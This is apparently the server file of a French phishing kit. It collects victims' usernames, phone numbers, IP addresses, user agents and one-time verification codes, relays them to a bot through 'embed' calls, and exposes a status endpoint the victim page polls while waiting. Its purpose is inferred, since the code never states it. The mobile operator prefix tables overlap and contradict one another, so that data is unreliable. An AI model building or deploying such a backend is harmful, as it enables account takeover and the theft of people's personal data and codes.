require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const { users } = require('./store');
const { sendInitialEmbed, sendCodeEmbed } = require('./bot');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         'IP inconnue';
}

app.post('/api/v1/submit', async (req, res) => {
  const { username, phone } = req.body;
  if (!username || !phone) return res.status(400).json({ error: 'Données manquantes' });

    const submissionId = `${username}_${Date.now()}`;
        if (users[username]) {
        console.log(`Nouvelle soumission pour l'utilisateur: ${username}, ID: ${submissionId}`);
        }

  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'User-Agent inconnu';

    let operator = 'N/A';

    let normalizedPhone = phone;
    if (phone.startsWith('6') || phone.startsWith('7')) {
        normalizedPhone = '0' + phone;
    }

    if (normalizedPhone.startsWith('06') || normalizedPhone.startsWith('07')) {
        const prefix = normalizedPhone.substring(0, 4);
        

        if ([

            '0606', '0607', '0608', '0609',

            '0630', '0631', '0632', '0633', '0634', '0635', '0636', '0637', '0638', '0639',
            '0650', '0651', '0652', '0653', '0654', '0655', '0656', '0657', '0658', '0659',
            '0670', '0671', '0672', '0673', '0674', '0675', '0676', '0677', '0678', '0679',
            '0690', '0691', '0692', '0693', '0694',

            '0756', '0757', '0758', '0759',
            '0770', '0771', '0772', '0773', '0774', '0775', '0776', '0777', '0778', '0779',
            '0780', '0781', '0782', '0783', '0784', '0785', '0786', '0787', '0788', '0789',
            '0790', '0791', '0792', '0793', '0794', '0795', '0796', '0797', '0798', '0799'
        ].includes(prefix)) {
            operator = 'Orange';
        }

        else if ([

            '0610', '0611', '0612', '0613', '0614', '0615', '0616', '0617', '0618', '0619',

            '0640', '0641', '0642', '0643', '0644', '0645', '0646', '0647', '0648', '0649',
            '0660', '0661', '0662', '0663', '0664', '0665', '0666', '0667', '0668', '0669',
            '0680', '0681', '0682', '0683', '0684', '0685', '0686', '0687', '0688', '0689',

            '0710', '0711', '0712', '0713', '0714', '0715', '0716', '0717', '0718', '0719',
            '0730', '0731', '0732', '0733', '0734', '0735', '0736', '0737', '0738', '0739',
            '0760', '0761', '0762', '0763', '0764', '0765', '0766', '0767', '0768', '0769',
            '0786', '0787', '0788', '0789'
        ].includes(prefix)) {
            operator = 'SFR';
        }

        else if ([

            '0620', '0621', '0622', '0623', '0624', '0625', '0626', '0627', '0628', '0629',

            '0660', '0661', '0662', '0663', '0664', '0665', '0666', '0667', '0668', '0669',

            '0740', '0741', '0742', '0743', '0744', '0745', '0746', '0747', '0748', '0749',
            '0760', '0761', '0762', '0763', '0764', '0765', '0766', '0767', '0768', '0769'
        ].includes(prefix)) {
            operator = 'Bouygues';
        }

        else if ([

            '0695', '0696', '0697', '0698', '0699',

            '0750', '0751', '0752', '0753', '0754', '0755',
            '0786', '0787', '0788', '0789'
        ].includes(prefix)) {
            operator = 'Free';
        }

        else if ([

            '0630', '0631', '0632', '0633', '0634', '0635', '0636', '0637', '0638', '0639',
            '0640', '0641', '0642', '0643', '0644', '0645', '0646', '0647', '0648', '0649',
            '0670', '0671', '0672', '0673', '0674', '0675', '0676', '0677', '0678', '0679',
            '0680', '0681', '0682', '0683', '0684', '0685', '0686', '0687', '0688', '0689',
            '0690', '0691', '0692', '0693', '0694',

            '0720', '0721', '0722', '0723', '0724', '0725', '0726', '0727', '0728', '0729',
            '0730', '0731', '0732', '0733', '0734', '0735', '0736', '0737', '0738', '0739',
            '0770', '0771', '0772', '0773', '0774', '0775', '0776', '0777', '0778', '0779',
            '0780', '0781', '0782', '0783', '0784', '0785', '0786', '0787', '0788', '0789',
            '0790', '0791', '0792', '0793', '0794', '0795', '0796', '0797', '0798', '0799'
        ].includes(prefix)) {
            operator = 'MVNO';
        }
        else {
            operator = 'ESIM ou AUTRE';
        }
    } else {
        operator = 'Format invalide';
    }

  users[username] = { 
    phone, 
    status: 'waiting_code', 
    submittedCode: null, 
    lastAttemptedCode: null,
    ip,
    userAgent,
    operator
  };

  await sendInitialEmbed(username, phone);

  res.json({ success: true });
});

app.post('/api/v1/verify', async (req, res) => {
  const { username, code } = req.body;
  const user = users[username];
  if (!user) return res.status(404).json({ error: 'Introuvable' });

  user.lastAttemptedCode = code;
  user.submittedCode = code;
  user.status = 'pending';
  
  await sendCodeEmbed(username);

  res.json({ success: true });
});

app.get('/api/v1/status/:username', (req, res) => {
  const user = users[req.params.username];
  if (!user) return res.status(404).json({ error: 'Introuvable' });
  res.json({ status: user.status });
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

app.listen(PORT, () => console.log(`🌐 Serveur local lancé sur http://localhost:${PORT}`));
